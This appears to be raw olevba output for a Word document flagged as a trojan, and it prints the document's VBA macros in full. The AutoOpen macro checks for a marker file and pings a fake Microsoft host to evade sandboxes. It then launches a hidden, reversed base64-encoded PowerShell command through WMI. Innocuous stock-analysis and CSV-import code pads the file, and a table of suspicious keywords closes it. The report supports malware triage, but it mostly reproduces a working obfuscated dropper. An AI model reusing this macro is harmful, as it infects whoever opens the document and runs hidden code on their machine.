olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.SAgent.gen-4986e69190027128e0c573f0aa29978102dde196ddf47391ad1c60c54f68e0e9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.SAgent.gen-4986e69190027128e0c573f0aa29978102dde196ddf47391ad1c60c54f68e0e9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: HEUR-Trojan.MSOffice.SAgent.gen-4986e69190027128e0c573f0aa29978102dde196ddf47391ad1c60c54f68e0e9 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Dim strFileExists As String
strFileExists = Dir("C:\" + "\aa" + "a_T" + "ouch" + "Me" + "N" + "ot.txt")
If strFileExists <> "" Then
       End
End If

Set Ieraj = GetObject("winmgmts:").Get("Win32_PingS" + "tatus.Address='treIean" + "bvjeal.micro" + "soft.com',ResolveAddr" + "essNames=True")
With Ieraj
    If .StatusCode = 45 - 45 Then
            End
        ElseIf .StatusCode > 321 - 321 Then
            End
        End If
End With
DoEvents
Call GetObject(StrReverse("ss" + "ec" + "orP_" + "23niW" + ":2" + "vmi" + "c\t" + "oor:" + "stm" + "gm" + "n" + "iw")). _
Create(StrReverse("=AgbAUGA5BwbAIGAgAAdAMHApBATAQHAu" + "BQZA0GA1BwZAIHABBQLAACA5BwcAQHAqBAMAACAzBwcAUGAjBwbAIHAQBQLAQHAyBQYAQHATBAIAACA7AgbAUGA5BwbAIGAgAANA8GA0BgYAwGAgAQZAQGAvBwYAUGAkBQLAACAsBQaAQHA1BAdAIHAlBwYAAC" + "A7AgIAAFANBQRAQFA6AgdA4GAlBAJAICAgAAaAQHAhBAUA0CAgAgbA8GApBAdAEGAjBwbAwEAtAAdAUGATBAIAsDAiAQbA8G" + "AjBgLAkFAsBwaAoFAJBAXAAFANBQRAQFA6AgdA4GAlBAJAICAsAgIAQDAvBAdAIGAsBAXAAFANBQRAQFA6AgdA4GAlBAJAICAsAgIA" + "0GAvBwYA4CA5BwcAQHAqBAMAwFAQBQTAUEAUBgOAYHAuBQZAQCAiAAIA4GAvBQaAQHAhBgbAkGA0BwcAUGAEBQLAACAtBwbAMGAuA" + "QWAwGArBgWAkEAvAAMAUDAuAwMAcDAxAgLAQDA0AgMA4CA1AAOAEDAvAwLAoDAwBAdAQHAo" + "BALA0GAvBwYA4CAyBQYAoEASBwLAADA1AgLAMDA3AQMA4CA0AANAIDAuAQNAgDAxAwLA8CA6AAcAQHA0BAaAwCAtBwbAMGAuAgQAoFAmBgWAsGAvAAMAUDAuAwMAcDAx" + _
"AgLAQDA0AgMA4CA1AAOAEDAvAwLAoDAwBAdAQHAoBAIAUGAjBgcAUHAvBwUA0CAgAgcAUGAmBwcA4GAhBgcAQFAzBAdAkGACBQLAQHAyBQYAQHATBAIAsDAyBQZAYGAzBgbAEGAyBAVAMHA0B" + "QaAIEAgAQZAwGA1BAZA8GANBQLAQHAyBwbAAHAtBQS e- ne" + "ddi" + "h ely" + "tswodn" + "iw- l" + StrReverse("hel") + "sr" + "e" + "w" + "op"), Null, Null, BehanKe)
End Sub

Sub Homework2()
    
    ' Create a script that will loop through all the stocks for one year and output the following information.
        ' The ticker symbol.
        ' Yearly change from opening price at the beginning of a given year to the closing price at the end of that year.
        ' The percent change from opening price at the beginning of a given year to the closing price at the end of that year.
        ' The total stock volume of the stock.
    ' You should also have conditional formatting that will highlight positive change in green and negative change in red.
    
                
    
    'loop thtrough Worksheets
    
    For Each ws In Worksheets  'remember to add the ws to each cell reference
        
        ' set the table headers
        ws.Range("I1").Value = "Ticker"
        ws.Range("J1").Value = "Yearly Change"
        ws.Range("K1").Value = "Percent Change"
        ws.Range("L1").Value = "Total Stock Volume"
    
    
        'Dim year_change As Double
        'Dim pct_change As Double
        
        ' define variable holding the ticker
        Dim ticker As String
        
        ' declare the variable holdingthe open/close price
        Dim openprice As Double
        Dim closeprice As Double
        Dim pct_change As Double
        ' declare the variable holding the total volume and set initial value for the counter
        Dim total_volume As LongLong
        total_volume = 0
        
        ' counter for number of rows
        Dim icounter As Integer
        icounter = 0
        
        ' define new tablerow starting point
        Dim new_table_row As Long
        new_table_row = 2
        
        ' find the last row
        lastRow = ws.Cells(Rows.Count, 1).End(xlUp).Row
                
        ' Loop through tickers
        For I = 2 To lastRow
            
            If ws.Cells(I, 1).Value <> ws.Cells(I + 1, 1).Value Then
                
                icounter = icounter + 1
                
                       
                ' set ticker name
                ticker = ws.Cells(I, 1).Value
                ' add total to each ticker
                total_volume = total_volume + ws.Cells(I, 7).Value
                
                ' set open and close values
                closeprice = ws.Cells(I, 6).Value
                openprice = ws.Cells(I - icounter + 1, 3).Value
                y_change = closeprice - openprice
                
                If openprice = 0 Then
                    pct_change = 0
                Else
                    pct_change = y_change / openprice
                End If
                          
                ' write backon the new table ticker and total volume
                ws.Range("I" & new_table_row).Value = ticker
                ws.Range("L" & new_table_row).Value = total_volume
                
                
                ' write back the yearly change & percent change
                ws.Range("J" & new_table_row).Value = y_change
                ws.Range("K" & new_table_row).Value = pct_change
                
                ' incremen the new table row
                new_table_row = new_table_row + 1
                
                ' reset totals
                total_volume = 0
                icounter = 0
            
            ' When the following cell is the same ticker
            Else
                
                ' Add up total vol. Add up the counter for the number of rows
                total_volume = total_volume + ws.Cells(I, 7).Value
                icounter = icounter + 1
            
            End If
            
            
        Next I
        
        ' Format Cells autofit and percentageo pct_change
        ws.Columns("I:Q").Columns.AutoFit
        ws.Columns("K").NumberFormat = "0.00%"
        
        ' conditional formating the y_change column
        ' declare varibles
        redcolor = 3
        greencolor = 4
        
        ' find summary table last row
        lastRow2 = ws.Cells(Rows.Count, 9).End(xlUp).Row
        
        ' iterate within y_change in the new table to format cells
        For y = 2 To lastRow2
            If ws.Cells(y, 10).Value > 0 Then
                ws.Cells(y, 10).Interior.ColorIndex = greencolor
            ElseIf ws.Cells(y, 10).Value < 0 Then
                ws.Cells(y, 10).Interior.ColorIndex = redcolor
        
            End If
        
        Next y
        
    
    Next ws
    
End Sub



Public Sub ImportCsvAskFile(ByVal tableName As String)
    Dim v As Variant
    With Application.FileDialog(1)
        .AllowMultiSelect = True
        .Filters.Clear
        .Filters.Add "CSV files", "*.csv"
        .Filters.Add "All files", "*.*"
        .FilterIndex = 0
        .Title = "Import CSV file into [" & tableName & "]"
        If .Show() <> 0 Then
            For Each v In .SelectedItems
                ImportCsv tableName, v
            Next
        End If
    End With

End Sub

Public Sub ImportCsv(ByVal tableName As String, ByVal fileName As String)

    Dim t As DAO.Recordset
    Dim separator As String
    Dim mappedColumns As New Collection
    Dim mappedColumnIndexes As New Collection
    Dim data As Collection
    Dim v As Variant
    Dim n As Integer
    
    Set t = CurrentDb.TableDefs(tableName).OpenRecordset(dbOpenTable)

    '' Detect separator:
    Open fileName For Input As #1
    separator = AutoDetectSeparator(1)
    Close #1
    
    '' Read header line and map columns:
    Open fileName For Input As #1
    Set data = ReadCsvLineFromFile(1, separator)
    On Error Resume Next
    n = 0
    For Each v In data
        n = n + 1
        mappedColumns.Add t.Fields(v)
        If Err.Number = 3265 Then
            mappedColumns.Add Nothing
            Err.Clear
        Else
            mappedColumnIndexes.Add n
        End If
    Next
    On Error GoTo 0
    
    '' Proceed with other lines:
    Do While Not EOF(1)
        Set data = ReadCsvLineFromFile(1, separator)
        t.AddNew
        For Each v In mappedColumnIndexes
            If data(v) <> "" Then mappedColumns(v).Value = data(v)
        Next
        t.Update
    Loop

    Close #1
    
    t.Close
    Set t = Nothing

End Sub

Private Function AutoDetectSeparator(ByVal fileNumber As Integer) As String
    Dim linestr As String
    Dim septab As Integer, sepcom As Integer, sepsem As Integer
    Line Input #fileNumber, linestr
    septab = InStr(linestr, vbTab)
    If septab = 0 Then septab = Len(linestr)
    sepcom = InStr(linestr, ",")
    If sepcom = 0 Then sepcom = Len(linestr)
    sepsem = InStr(linestr, ";")
    If sepsem = 0 Then sepsem = Len(linestr)
    If septab < sepcom Then
        AutoDetectSeparator = vbTab
    ElseIf sepcom < sepsem Then
        AutoDetectSeparator = ","
    Else
        AutoDetectSeparator = ";"
    End If
End Function

Private Function ReadCsvLineFromFile(ByVal fileNumber As Integer, ByVal separator As String) As Collection
    Dim result As New Collection
    Dim str As String
    
    Line Input #fileNumber, str
    
    Set ReadCsvLineFromFile = ReadCsvLine(str, separator)
    
End Function

Private Function ReadCsvLine(ByVal str As String, ByVal separator As String) As Collection
    Dim result As New Collection
    Dim startpos As Integer, seppos As Integer, endpos As Integer
    
    '' Skip UTF BOM:
    If Left(str, 3) = "?" Then str = Mid(str, 4)
    
    startpos = 1
    Do
        If Mid(str, startpos, 1) = """" Then
            endpos = startpos
            Do
                endpos = InStr(endpos + 1, str, """")
                If endpos = Len(str) Then Exit Do
                If Mid(str, endpos + 1, 1) = separator Then Exit Do
            Loop
            result.Add Replace(Mid(str, startpos + 1, endpos - startpos - 1), """""", """")
            startpos = endpos + 1 + Len(separator)
        Else
            endpos = InStr(startpos, str, separator)
            If endpos = 0 Then
                result.Add Mid(str, startpos)
                startpos = Len(str)
            Else
                result.Add Mid(str, startpos, endpos - startpos)
                startpos = endpos + 1
            End If
        End If
    Loop While startpos < Len(str)
    
    Set ReadCsvLine = result

End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |year_change         |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|output              |May write to a file (if combined with Open)  |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

